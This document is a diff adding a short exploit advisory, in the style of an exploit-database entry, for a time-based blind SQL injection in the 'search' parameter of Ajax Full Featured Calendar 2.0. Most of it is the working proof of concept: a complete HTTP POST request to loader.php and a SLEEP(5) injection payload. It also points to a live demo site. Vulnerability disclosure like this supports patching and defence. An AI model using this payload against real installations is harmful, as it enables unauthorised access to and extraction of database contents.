@@ -1,0 +1,36 @@
+# Exploit Title: Ajax Full Featured Calendar 2.0 - 'search' SQL Injection
+# Dork: N/A
+# Date: 25.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/ajax-full-featured-calendar-2/10158465
+# Version: 2.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The vulnerability allows an attacker to inject sql commands from the search section with 'search' parameter.
+====================================================
+# Demo : http://pauloreg.com/d/affc2/index.php
+# PoC : SQLi :
+
+POST /d/affc2/includes/loader.php HTTP/1.1
+Host: test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://test.com/d/affc2/index.php
+Content-Length: 11
+Cookie: PHPSESSID=pt848bokjvads6c9kvgs1nu973
+Connection: keep-alive
+search=test
+
+Parameter: search (POST)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: search=test%' AND SLEEP(5) AND '%'='
+
+
+====================================================
